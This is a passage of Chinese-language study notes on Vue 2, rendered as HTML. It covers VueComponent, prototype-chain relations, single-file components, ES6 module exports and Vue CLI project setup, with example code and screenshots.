<li><p>注意</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915200022570.png" srcset="/img/loading.gif" lazyload alt="image-20210915200022570" style="zoom:67%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915200054920.png" srcset="/img/loading.gif" lazyload alt="image-20210915200054920" style="zoom:67%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915200112259.png" srcset="/img/loading.gif" lazyload alt="image-20210915200112259" style="zoom:80%;" />

<p><code>VueComponent</code>此处被调用了两次，如果不写标签，那么就不会调用</p>
</li>
</ul>
</li>
<li><p>特别注意：每次调用<code>Vue.extend</code>，返回的都是一个全新的<code>VueComponent</code>!!!</p>
</li>
<li><p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915200951458.png" srcset="/img/loading.gif" lazyload alt="image-20210915200951458"></p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915201109978.png" srcset="/img/loading.gif" lazyload alt="image-20210915201109978" style="zoom:80%;" />

<p>但是注意：<code>school</code>的<code>VueComponent</code>和<code>hello</code>的<code>VueComponent</code>是不同的！</p>
<ul>
<li><p>验证一：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">console</span>.log(school === hello) <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>验证二：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">school.a = <span class="hljs-number">99</span><br><span class="hljs-built_in">console</span>.log(school.a, hello.a) <span class="hljs-comment">// 99, undefined</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>验证三：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js">Vue.extend = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">extendOptions</span>) </span>&#123;<br>  <span class="hljs-comment">/*……………………………………*/</span><br>  <span class="hljs-keyword">var</span> Sub = <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">VueComponent</span> (<span class="hljs-params">options</span>) </span>&#123;<br>    <span class="hljs-built_in">this</span>._init(options);<br>  &#125;;<br>  <span class="hljs-comment">/*……………………………………*/</span><br>  <span class="hljs-keyword">return</span> Sub<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>每一次调用<code>Vue.extend</code>，都返回了一个<code>VueComponent</code>，但是每一次的<code>VueComponent</code>都是现定义的，传入的<code>options</code>是不同的。</p>
</li>
</ul>
</li>
<li><p>关于this指向：</p>
<ul>
<li><p>组件配置中：</p>
<p>data函数、methods函数、watch中的函数、computed中的函数，它们的this均是【<strong>VueComponent实例对象</strong>】</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915202948035.png" srcset="/img/loading.gif" lazyload alt="image-20210915202948035" style="zoom: 80%;" />

<p>VueComponent（vc）实例对象和vm极其相似，例如都有数据代理</p>
</li>
<li><p><code>new Vue(options)</code>配置中：</p>
<p>data函数、methods函数、watch中的函数、computed中的函数，它们的this均是【<strong>Vue实例对象</strong>】</p>
</li>
<li><p><code>VueComponent</code>的实例对象，以后简称vc（也可称为：组件实例对象）</p>
<p><code>Vue</code>的实例对象，以后简称vm</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915204130346.png" srcset="/img/loading.gif" lazyload alt="image-20210915204130346"></p>
<p><code>$children</code>和<code>$parent</code></p>
<p>组件是可复用的<code>Vue</code>实例，vc有的配置vm都有，但是vm有的配置，vc不一定有。</p>
<h3 id="2-6-一个重要的内置关系"><a href="#2-6-一个重要的内置关系" class="headerlink" title="2.6 一个重要的内置关系"></a>2.6 一个重要的内置关系</h3><p>顺着<code>Demo</code>函数的显式原型属性可以访问到原型对象；顺着实例的隐式原型属性对象也可以访问到原型对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js">  &lt;script&gt;<br>    Vue.config.productionTip = <span class="hljs-literal">false</span> ;<span class="hljs-comment">// 阻止VUE启动时生成生产提示</span><br>      <span class="hljs-comment">// 定义一个构造函数</span><br>      <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Demo</span>(<span class="hljs-params"></span>)</span>&#123;<br>          <span class="hljs-built_in">this</span>.a = <span class="hljs-number">1</span><br>          <span class="hljs-built_in">this</span>.b = <span class="hljs-number">2</span><br>      &#125;<br>      <span class="hljs-comment">//  创建一个Demo实例对象</span><br>      <span class="hljs-keyword">const</span> d =<span class="hljs-keyword">new</span> Demo()<br><br>      <span class="hljs-built_in">console</span>.log(Demo.prototype) <span class="hljs-comment">// 显式原型属性</span><br>      <span class="hljs-built_in">console</span>.log(d.__proto__) <span class="hljs-comment">// 隐式原型属性</span><br><br>      <span class="hljs-comment">// 程序员通过显式原型属性操作原型对象，追加一个x属性值99</span><br>      Demo.prototype.x = <span class="hljs-number">99</span><br>      <span class="hljs-built_in">console</span>.log(d.__proto__.x) / d.x<br><br><span class="hljs-built_in">console</span>.log(Demo.prototype === d.__proto__) <span class="hljs-comment">// true</span><br>  &lt;/script&gt;<br></code></pre></td></tr></table></figure>

<hr>
<ul>
<li>重要结论：<ul>
<li>一个重要的内置关系：<code>VueComponent.prototype.__proto__ === Vue.prototype</code></li>
<li>为什么要有这个关系：让组件实例对象(vc)可以访问到原型上的属性和方法。</li>
</ul>
</li>
</ul>
<p>原型链！</p>
 <img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915222417430.png" srcset="/img/loading.gif" lazyload alt="image-20210915222417430" style="zoom:80%;" />

<ul>
<li><p>实例对象上有隐式原型属性<code>__proto__</code>，函数上才有显式原型属性<code>prototype</code></p>
<p><strong>注意：实例的隐式原型属性，永远指向自己缔造者的原型对象！</strong></p>
</li>
</ul>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210915224653157.png" srcset="/img/loading.gif" lazyload alt="image-20210915224653157"></p>
<p><code>VueComponent</code>原型对象的原型对象就是<code>Vue</code>的原型对象</p>
<p>测试：通过<code>vm</code>和<code>vc</code>都可以访问到添加到Vue原型对象上的<code>x</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-comment">&lt;!--准备一个容器--&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">school</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">school</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript">  Vue.config.productionTip = <span class="hljs-literal">false</span>;<span class="hljs-comment">// 阻止VUE启动时生成生产提示</span></span><br>  Vue.prototype.x = 99<br><br><span class="javascript">  <span class="hljs-comment">// 创建学校组件</span></span><br><span class="javascript">  <span class="hljs-keyword">const</span> school = Vue.extend(&#123;</span><br>    template: `<br><span class="handlebars"><span class="xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">name</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">address</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;showX&quot;</span>&gt;</span>点击展示x<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span> `,</span></span><br><span class="javascript">    <span class="hljs-function"><span class="hljs-title">data</span>(<span class="hljs-params"></span>)</span> &#123;</span><br><span class="javascript">      <span class="hljs-keyword">return</span> &#123;</span><br><span class="javascript">        name: <span class="hljs-string">&#x27;UESTC&#x27;</span>,</span><br><span class="javascript">        address: <span class="hljs-string">&#x27;成华区&#x27;</span></span><br>      &#125;<br>    &#125;,<br>    methods:&#123;<br><span class="javascript">      <span class="hljs-function"><span class="hljs-title">showX</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="javascript">        <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>.x)</span><br>      &#125;<br>    &#125;<br>  &#125;)<br><br><span class="javascript">  <span class="hljs-comment">// 创建一个vm</span></span><br><span class="javascript">  <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> Vue(&#123;</span><br><span class="javascript">    el: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br>    data: &#123;<br><span class="javascript">      msg: <span class="hljs-string">&#x27;miketaylorjuly123.cn&#x27;</span></span><br>    &#125;,<br>    components:&#123;<br>      school<br>    &#125;<br>  &#125;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>



<h3 id="2-7-单文件组件"><a href="#2-7-单文件组件" class="headerlink" title="2.7 单文件组件"></a>2.7 单文件组件</h3><p>导言：将<code>.vue</code>或<code>.less</code>文件交给浏览器，是无法直接运行的，需要加工为<code>html/css/js</code>前端三件套代码才能实现，浏览器才能识别。处理加工的方法：</p>
<ul>
<li><code>webpack</code>：自己配置<code>loader</code>和插件，完成整个编译流程，搭建工作流</li>
<li>脚手架<code>VUE CLI</code>，已经打造的工作流</li>
</ul>
<p>单文件组件结构：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916105028796.png" srcset="/img/loading.gif" lazyload alt="image-20210916105028796" style="zoom:67%;" />

<p>使用插件：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916104405246.png" srcset="/img/loading.gif" lazyload alt="image-20210916104405246" style="zoom:80%;" />

<p>非单文件组件的弊病：样式不能跟着组件走</p>
<ul>
<li><p>ES6模块化知识：三种暴露方式</p>
<ul>
<li><p>分别暴露</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916105445512.png" srcset="/img/loading.gif" lazyload alt="image-20210916105445512" style="zoom:80%;" />
</li>
<li><p>统一暴露</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916105718592.png" srcset="/img/loading.gif" lazyload alt="image-20210916105718592" style="zoom:80%;" />
</li>
<li><p>默认暴露</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916105818365.png" srcset="/img/loading.gif" lazyload alt="image-20210916105818365" style="zoom:80%;" />
</li>
<li><p>一般使用默认暴露，因为单文件组件只需要暴露一个组件，引入时：</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">import</span> xxx <span class="hljs-keyword">from</span> xxxx<br></code></pre></td></tr></table></figure>

<p>使用分别暴露、统一暴露，引入时：</p>
<figure class="highlight puppet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs puppet"><span class="hljs-keyword">import</span> &#123;xxx&#125; <span class="hljs-keyword">from</span> <span class="hljs-keyword">xxxx</span><br></code></pre></td></tr></table></figure>

<p>相对更加简便，代码化简后：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916110156960.png" srcset="/img/loading.gif" lazyload alt="image-20210916110156960" style="zoom:80%;" />

<p>可以直接暴露配置对象：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916110239879.png" srcset="/img/loading.gif" lazyload alt="image-20210916110239879" style="zoom:80%;" />

<p>加上组件命名</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916110708786.png" srcset="/img/loading.gif" lazyload alt="image-20210916110708786" style="zoom:80%;" />

</li>
</ul>
</li>
</ul>
<hr>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916112146322.png" srcset="/img/loading.gif" lazyload alt="image-20210916112146322" style="zoom:80%;" />

<ul>
<li><p>index.html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>练习单文件组件语法<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;./main.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>App.vue</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>    &lt;div&gt;<br>        &lt;School&#x2F;&gt;<br>        &lt;Student&gt;&lt;&#x2F;Student&gt;<br>    &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>&#x2F;&#x2F; 引入组件<br>import School from &#39;.&#x2F;School&#39;<br>import Student from &#39;.&#x2F;Student&#39;<br><br>export default &#123;<br>  name: &#39;App&#39;,<br>  component: &#123; School, Student &#125;,<br>&#125;<br>&lt;&#x2F;script&gt;<br><br>&lt;style&gt;<br>&lt;&#x2F;style&gt;<br></code></pre></td></tr></table></figure>
</li>
<li><p>main.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> App <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./App&#x27;</span><br><br><span class="hljs-keyword">new</span> Vue(&#123;<br>  template: <span class="hljs-string">`&lt;App&gt;&lt;/App&gt;`</span>,<br>  el: <span class="hljs-string">&#x27;#root&#x27;</span>,<br>  components: &#123; App &#125;,<br>&#125;)<br></code></pre></td></tr></table></figure>
</li>
<li><p>School.vue</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;!-- 组件的结构 --&gt;<br>  &lt;div&gt;<br>    &lt;h2 class&#x3D;&quot;name&quot;&gt;学校名称：&#123;&#123; schoolName &#125;&#125;&lt;&#x2F;h2&gt;<br>    &lt;h2 class&#x3D;&quot;position&quot;&gt;学校位置：&#123;&#123; schoolAddress &#125;&#125;&lt;&#x2F;h2&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>&#x2F;&#x2F; 组件的交互相关代码（数据 方法 ……）<br>export default &#123;<br>  name: &#39;School&#39;, &#x2F;&#x2F; 最好与文件名保持一致，不写的话注册组件可能随便起名<br>  data() &#123;<br>    return &#123;<br>      schoolName: &#39;UESTC&#39;,<br>      schoolAddress: &#39;成都市成华区建设路一环路东一段&#39;,<br>    &#125;<br>  &#125;,<br>&#125;<br>&lt;&#x2F;script&gt;<br><br>&lt;style lang&#x3D;&quot;&quot;&gt;<br>&#x2F;* 组件的样式 *&#x2F;<br>.position &#123;<br>  color: #8080ff;<br>&#125;<br>.name &#123;<br>  color: cyan;<br>&#125;<br>&lt;&#x2F;style&gt;<br></code></pre></td></tr></table></figure>
</li>
<li><p>Studet.vue</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;!-- 组件的结构 --&gt;<br>  &lt;div&gt;<br>    &lt;h2&gt;学生姓名：&#123;&#123; studentName &#125;&#125;&lt;&#x2F;h2&gt;<br>    &lt;h2&gt;学生年龄：&#123;&#123; studentAge &#125;&#125;&lt;&#x2F;h2&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;template&gt;<br><br>&lt;script&gt;<br>&#x2F;&#x2F; 组件的交互相关代码（数据 方法 ……）<br>export default &#123;<br>  name: &#39;Student&#39;, &#x2F;&#x2F; 最好与文件名保持一致，不写的话注册组件可能随便起名<br>  data() &#123;<br>    return &#123;<br>      studentName: &#39;张加林&#39;,<br>      studentAge: 20<br>    &#125;<br>  &#125;,<br>&#125;<br>&lt;&#x2F;script&gt;<br><br>&lt;style lang&#x3D;&quot;&quot;&gt;<br>&#x2F;* 组件的样式 *&#x2F;<br>&lt;&#x2F;style&gt;<br></code></pre></td></tr></table></figure>

<p>但是需要脚手架才能运行</p>
</li>
</ul>
<h2 id="第三章-脚手架"><a href="#第三章-脚手架" class="headerlink" title="第三章 脚手架"></a>第三章 脚手架</h2><h3 id="3-1-创建脚手架"><a href="#3-1-创建脚手架" class="headerlink" title="3.1 创建脚手架"></a>3.1 创建脚手架</h3><p><code>Vue</code> 脚手架是<code> Vue</code> 官方提供的标准化开发工具（开发平台）</p>
<p>目前脚手架最新的版本是：4.x（注意与<code>Vue</code>版本区别开）</p>
<p><code>Vue</code>的版本不一定要和脚手架版本对应，一般脚手架版本使用最新的即可，因为脚手架向下兼容低版本的<code>Vue</code>，但是不要这样：很新的<code>Vue</code>版本搭配很旧的脚手架版本</p>
<p>脚手架官网：<a href="https://cli.vuejs.org/zh/">Vue CLI (vuejs.org)</a>：command line interface命令行接口工具</p>
<ul>
<li><p>创建vue脚手架：</p>
<ul>
<li><p>全局安装<code>@vue/cli</code>：</p>
<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-built_in">npm</span> install -g @vue/cli<br></code></pre></td></tr></table></figure>

<p>一定要把<code>npm</code>地址配置成镜像：</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">npm <span class="hljs-built_in">config</span> <span class="hljs-built_in">set</span> registry<br>https:<span class="hljs-comment">//registry.npm.taobao.org</span><br></code></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916113922697.png" srcset="/img/loading.gif" lazyload alt="image-20210916113922697"></p>
</li>
<li><p>切换到你要创建项目的目录，然后使用命令创建项目</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">vue create xxxx</span><br></code></pre></td></tr></table></figure>

<p>项目取名尽可能回避主流库的名称</p>
<p><img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916114702169.png" srcset="/img/loading.gif" lazyload alt="image-20210916114702169"></p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916114854880.png" srcset="/img/loading.gif" lazyload alt="image-20210916114854880" style="zoom:80%;" />

<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916115014247.png" srcset="/img/loading.gif" lazyload alt="image-20210916115014247" style="zoom:80%;" />

<p>同局域网的人都可以使用访问。</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">Ctrl</span> <span class="hljs-operator">+</span> <span class="hljs-built_in">C</span>停止项目<br></code></pre></td></tr></table></figure>

</li>
</ul>
</li>
</ul>
<h3 id="3-2-分析脚手架结构"><a href="#3-2-分析脚手架结构" class="headerlink" title="3.2 分析脚手架结构"></a>3.2 分析脚手架结构</h3><p>项目文件基本结构：</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916124723761.png" srcset="/img/loading.gif" lazyload alt="image-20210916124723761" style="zoom: 67%;" />

<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs text">├── node_modules<br>├── public<br>│ ├── favicon.ico: 页签图标<br>│ └── index.html: 主页面<br>├── src<br>│ ├── assets: 存放静态资源，例如logo图，音视频……<br>│ │ └── logo.png<br>│ │── component: 存放组件<br>│ │ └── HelloWorld.vue<br>│ │── App.vue: 汇总所有组件<br>│ │── main.js: 入口文件<br>├── .gitignore: git 版本管制忽略的配置<br>├── babel.config.js: babel 的配置文件，ES6转ES5需要借助babel，详细参					  考babel官网<br>├── package.json: 应用包配置文件<br>├── README.md: 应用描述文件<br>├── package-lock.json：包版本控制文件<br></code></pre></td></tr></table></figure>

<ul>
<li><p>package.json</p>
<img src="https://gitee.com/zhangjialin_zhulan/myimagerepo/raw/master/images/image-20210916125212456.png" srcset="/img/loading.gif" lazyload alt="image-20210916125212456" style="zoom:80%;" />

<p>serve：开发过程中，使用这个命令，配置服务器，并运行</p>
<p>build：项目开发完成，构建打包成标准三件套，以便浏览器上运行</p>
<p>lint：几乎不用，对项目中书写的<code>.vue/js</code>文件全都进行一次语法检查，一般最后才使用</p>
</li>
<li><p>package-lock.json   包版本控制管理文件</p>
</li>
<li><pre><code>npm run serve
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs xml"><br>  执行后，直接运行 `main.js`<br><br>  打开终端：`Ctrl` + `~`<br><br>  脚手架高级功能：热更新（Hot Module Replacement--HMR）<br><br>  以后开发都是单页面应用<br><br>* index.html<br><br>  ```html<br>  <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>      <span class="hljs-comment">&lt;!-- 针对IE浏览器的一个特殊配置，含义是让IE浏览器以最高的渲染级别渲染页面，但是vue不支持IE8及其以下版本 --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br>      <span class="hljs-comment">&lt;!-- 开启移动端的理想视口 --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span 